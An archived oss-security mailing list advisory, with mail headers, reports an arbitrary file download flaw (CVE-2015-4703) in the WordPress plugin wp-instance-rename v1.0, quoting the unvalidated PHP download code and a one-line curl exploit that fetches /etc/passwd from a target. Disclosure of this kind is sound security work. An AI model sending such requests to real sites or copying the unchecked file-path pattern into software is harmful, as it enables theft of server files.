X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1706" "Tuesday" "23" "June" "2015" "16:08:55" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<C3898405-E7BE-469E-8C9F-4A827F7370A5@me.com>" "51" "[oss-security] Arbitrary File download in wordpress plugin wp-instance-rename v1.0" nil nil nil "6" "2015062320:08:55" "[oss-security] Arbitrary File download in wordpress plugin wp-instance-rename v1.0" (number mark "U       larry0@me.co Jun 23   51/1706  " thread-indent "\"[oss-security] Arbitrary File download in wordpress plugin wp-instance-rename v1.0\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 12077 invoked by uid 550); 23 Jun 2015 20:10:04 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 11481 invoked from network); 23 Jun 2015 20:09:08 -0000
X-Proofpoint-Virus-Version: vendor=fsecure
 engine=2.50.10432:5.14.151,1.0.33,0.0.0000
 definitions=2015-06-23_07:2015-06-23,2015-06-23,1970-01-01 signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 suspectscore=0 phishscore=0 adultscore=0 bulkscore=0 classifier=spam adjust=0
 reason=mlx scancount=1 engine=7.0.1-1412110000 definitions=main-1506230320
From: "Larry W. Cashdollar" <larry0@me.com>
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
Message-id: <C3898405-E7BE-469E-8C9F-4A827F7370A5@me.com>
Date: Tue, 23 Jun 2015 16:08:55 -0400
To: Open Source Security <oss-security@lists.openwall.com>
MIME-version: 1.0 (Mac OS X Mail 8.2 \(2098\))
X-Mailer: Apple Mail (2.2098)
Subject: [oss-security] Arbitrary File download in wordpress plugin wp-instance-rename v1.0

Title: Arbitrary File download in wordpress plugin wp-instance-rename v1.0
Author: Larry W. Cashdollar, @_larry0
Date: 2015-06-12
Download Site: https://wordpress.org/plugins/wp-instance-rename/
Vendor: Vlajo
Vendor Notified: 2015-06-12
Advisory: http://www.vapid.dhs.org/advisory.php?v=3D127
Vendor Contact:
Description: WordPress Rename plugin allows you to easily rename the comple=
te WordPress installation. This plugin allows you to rename WordPress datab=
ase, WordPress directory, change every necessary configuration file, easily=
 from one page.
Vulnerability:
The code in mysqldump_download.php doesn't check that the requested file is=
 within the intended download directory:

try{
	$dbname   =3D $_GET["dbname"];
	$dumpfname =3D $_GET["dumpfname"];
	$backup_folder =3D $_GET["backup_folder"];=09
}catch (Exception $e){}

if(empty($backup_folder)){
	$backup_folder=3D"backup/";
}
echo "$dumpfname";
if (file_exists($dumpfname)) {=09=09
	// zip the dump file=09
	$name=3D$dbname . "_" . date("Y-m-d");=09
	$zipfname =3D $backup_folder.$name.".zip";
	$zip =3D new ZipArchive();=09
	if($zip->open($zipfname,ZIPARCHIVE::CREATE))=20
	{
	   $zip->addFile($dumpfname,$dumpfname);
	   $zip->close();
	}=09
	// read zip file and send it to standard output
	if (file_exists($zipfname)) {
		header('Content-Description: File Transfer');
		header('Content-Type: application/octet-stream');
		header('Content-Disposition: attachment; filename=3D'.basename($zipfname)=
);
		flush();
		readfile($zipfname);

CVEID: 2015-4703
OSVDB:
Exploit Code:
	=E2=80=A2 curl --data "dbname=3Dwp&dumpfname=3D/etc/passwd&backup_folder=
=3D."  http://www.example.com/wp-instance-rename/mysqldump_download.php -o =
p.zip=20=
